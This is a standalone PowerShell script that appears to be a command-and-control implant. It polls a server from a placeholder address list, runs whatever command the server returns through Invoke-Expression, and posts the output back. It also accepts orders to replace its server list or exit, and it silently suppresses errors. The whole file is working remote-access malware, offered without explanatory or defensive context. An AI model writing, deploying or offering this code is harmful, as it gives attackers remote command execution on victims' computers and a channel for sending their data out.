$servers = @("x.x.x.x:x")
$iden = -join ((65..90) + (97..122) | Get-Random -Count 4 | % {[char]$_})
$output = ""
while ($true) {
    try {
        $server = $servers[(Get-Random -Maximum ([array]$servers).count)]
        $body = "${iden}:${output}"
        $response = Invoke-WebRequest -Body $body -Method "POST" -Uri "http://${server}"
        $output = ""
        if ($response.StatusCode -eq 200) {
            if ($response.Content -ne "") {
                $values = $response.Content.Split(':', 2)
                $command = $values[0]
                $parameters = $values[1]
                if ($command -eq "T") {
                    exit
                }
                if ($command -eq "N") {
                    $servers = $parameters.Split(',')
                }
                if ($command -eq "C") {
                    $output = Invoke-Expression $parameters
                }
            }
        }
    }
    catch {
    }
    Start-Sleep 5
}